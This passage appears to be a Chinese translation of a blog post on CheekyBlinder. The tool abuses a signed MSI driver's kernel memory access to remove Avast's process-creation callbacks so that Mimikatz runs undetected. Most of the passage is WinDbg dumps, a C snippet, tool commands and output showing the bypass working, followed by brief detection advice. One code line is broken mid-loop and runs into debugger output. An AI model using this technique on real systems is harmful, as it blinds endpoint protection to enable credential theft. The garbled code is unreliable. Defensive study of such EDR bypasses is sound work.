    fffff802`23305ed0  ffffaa88`6c60fdcf ffffaa88`6c6106ff
    fffff802`23305ee0  ffffaa88`732701cf ffffaa88`7327130f
    fffff802`23305ef0  ffffaa88`771818af ffffaa88`7cb3b1bf
    fffff802`23305f00  00000000`00000000 00000000`00000000
    fffff802`23305f10  00000000`00000000 00000000`00000000
    lkd> dq nt!pssetcreateprocessnotifyroutine L1
    fffff802`235536b0  d233c28a`28ec8348
在此版本的Windows中，回调数组似乎位于 **PsSetCreateProcessNotifyRoutine + 0x24D810** 中。
现在，让我们使用MSI驱动程序和该驱动程序利用程序的作者提供的内存读取功能，来检索和列出这些回调例程。 我们还添加了功能以指定要删除的回调函数：
    const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress - 0x24D810;
    Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
    Log("[+] Enumerating process creation callbacks");
    int i = 0;
    for (i; i  dq nt!PspCreateProcessNotifyRoutine
    fffff800`1dd13ea0  ffffdb83`5d85030f ffffdb83`5da605af
    fffff800`1dd13eb0  ffffdb83`5df7c5df ffffdb83`5df7cdef
    fffff800`1dd13ec0  ffffdb83`6068a1df ffffdb83`6068a92f
    fffff800`1dd13ed0  ffffdb83`5df04bff ffffdb83`6068a9ef
    fffff800`1dd13ee0  ffffdb83`6068addf ffffdb83`5df0237f
    fffff800`1dd13ef0  ffffdb83`6322dc2f ffffdb83`652eecff
    fffff800`1dd13f00  00000000`00000000 00000000`00000000
    fffff800`1dd13f10  00000000`00000000 00000000`00000000
运行mimikatz会使Avast采取行动，如预期的那样：
加载我们的程序，会有如下输出：
    [+] Windows Version 1909 Found
    [+] Device object handle obtained: 0000000000000084
    [+] PsSetCreateProcessNotifyRoutine address: FFFFF8001DF616B0
    [+] Kernel base address: FFFFF8001D80E000
    [+] PspCreateProcessNotifyRoutine: FFFFF8001DD13EA0
    [+] Enumerating process creation callbacks
    [+] fffff8001d92f690 [ntoskrnl.exe + 0x121690]
    [+] fffff8001ebf7220 [cng.sys + 0x7220]
    [+] fffff8001e75b420 [ksecdd.sys + 0x1b420]
    [+] fffff8001fcfd9f0 [tcpip.sys + 0x1d9f0]
    [+] fffff800203dd930 [iorate.sys + 0xd930]
    [+] fffff800204a1720 [aswbuniv.sys + 0x1720]
    [+] fffff80021aa9ec0 [vm3dmp.sys + 0x9ec0]
    [+] fffff8001eb854d0 [CI.dll + 0x754d0]
    [+] fffff80020af25ac [aswSP.sys + 0x325ac]
    [+] fffff80021276aa0 [dxgkrnl.sys + 0x6aa0]
    [+] fffff800236e3cf0 [peauth.sys + 0x43cf0]
    [+] fffff80021836ed0 [aswArPot.sys + 0x6ed0]
谷歌搜索向我们显示aswArPot.sys，aswSP.sys和aswbuniv.sys是Avast驱动程序，因此我们现在至少知道对于进程通知，这些驱动程序可能阻止了我们的恶意程序。
我们使用我们的小程序卸载它们：
    PS C:\Dev\CheekyBlinder\x64\Release> .\CheekyBlinder.exe /delprocess fffff800204a1720
    [+] Windows Version 1909 Found
    [+] Removing process creation callback: FFFFF800204A1720
    [+] Device object handle obtained: 0000000000000084
    [+] PsSetCreateProcessNotifyRoutine address: FFFFF8001DF616B0
    [+] Kernel base address: FFFFF8001D80E000
    [+] PspCreateProcessNotifyRoutine: FFFFF8001DD13EA0
    [+] Enumerating process creation callbacks
    [+] fffff8001d92f690 [ntoskrnl.exe + 0x121690]
    [+] fffff8001ebf7220 [cng.sys + 0x7220]
    [+] fffff8001e75b420 [ksecdd.sys + 0x1b420]
    [+] fffff8001fcfd9f0 [tcpip.sys + 0x1d9f0]
    [+] fffff800203dd930 [iorate.sys + 0xd930]
    [+] fffff800204a1720 [aswbuniv.sys + 0x1720]
    Removing callback to FFFFF800204A1720 at address FFFFF8001DD13EC8
    [+] fffff80021aa9ec0 [vm3dmp.sys + 0x9ec0]
    [+] fffff8001eb854d0 [CI.dll + 0x754d0]
    [+] fffff80020af25ac [aswSP.sys + 0x325ac]
    [+] fffff80021276aa0 [dxgkrnl.sys + 0x6aa0]
    [+] fffff800236e3cf0 [peauth.sys + 0x43cf0]
    [+] fffff80021836ed0 [aswArPot.sys + 0x6ed0]
我们对其余两个驱动程序重复此步骤，并确认这些驱动程序不再在回调列表中列出：
    [+] Windows Version 1909 Found
    [+] Device object handle obtained: 00000000000000A4
    [+] PsSetCreateProcessNotifyRoutine address: FFFFF8001DF616B0
    [+] Kernel base address: FFFFF8001D80E000
    [+] PspCreateProcessNotifyRoutine: FFFFF8001DD13EA0
    [+] Enumerating process creation callbacks
    [+] fffff8001d92f690 [ntoskrnl.exe + 0x121690]
    [+] fffff8001ebf7220 [cng.sys + 0x7220]
    [+] fffff8001e75b420 [ksecdd.sys + 0x1b420]
    [+] fffff8001fcfd9f0 [tcpip.sys + 0x1d9f0]
    [+] fffff800203dd930 [iorate.sys + 0xd930]
    [+] fffff80021aa9ec0 [vm3dmp.sys + 0x9ec0]
    [+] fffff8001eb854d0 [CI.dll + 0x754d0]
    [+] fffff80021276aa0 [dxgkrnl.sys + 0x6aa0]
    [+] fffff800236e3cf0 [peauth.sys + 0x43cf0]
Windbg视图（注意先前列出了回调例程的为止目前被置零）：
    lkd> dq nt!PspCreateProcessNotifyRoutine
    fffff800`1dd13ea0  ffffdb83`5d85030f ffffdb83`5da605af
    fffff800`1dd13eb0  ffffdb83`5df7c5df ffffdb83`5df7cdef
    fffff800`1dd13ec0  ffffdb83`6068a1df 00000000`00000000
    fffff800`1dd13ed0  ffffdb83`5df04bff ffffdb83`6068a9ef
    fffff800`1dd13ee0  00000000`00000000 ffffdb83`5df0237f
    fffff800`1dd13ef0  ffffdb83`6322dc2f 00000000`00000000
    fffff800`1dd13f00  00000000`00000000 00000000`00000000
    fffff800`1dd13f10  00000000`00000000 00000000`00000000
现在我们可以不受限制地运行Mimikatz了：
## 监测和防御
就检测和预防而言，我认为蓝队会容易一些，但对于EDR来说可能并非如此。对于EDR供应商而言，难以跟踪到每一个受到攻击的签名驱动进行拉黑，并且无法解决0day漏洞的攻击。但尽管如此也应该采取一些防护措施来应对这一类攻击。
对于蓝队，监视服务创建和 **PspCreateProcessNotifyRoutine:**
特权的使用将会给你更多防范此类攻击的手段。其他一些建议是，不应该经常安装新的驱动，最好仅更新和维护，以及通过特权帐户安装驱动程序。从管理帐户进一步限制此特权也可能是一条值得探索的途径，该特权保留给专用的软件/硬件维护帐户，该帐户在不使用时会受到严格监控并被禁用。
## TODO
还有更多功能要实现。 我计划很快添加对其他回调例程的支持，以及可能添加恢复以前删除的回调的方法。 要可靠地找到
**PspCreateProcessNotifyRoutine** 数组，并检查是否可能失败，还需要做更多的工作，因为这会导致蓝屏死机。
最后，最好使用已知的蓝队工具（例如Sysmon）在企业环境中检测该活动的一些指标，以检测该活动。
###  实现代码
CheekyBlinder已在[这里](https://github.com/br-sn/CheekyBlinder "这里")发布。
请负责任地使用，该代码可能导致BSOD。目前仅支持Win 1909和2004。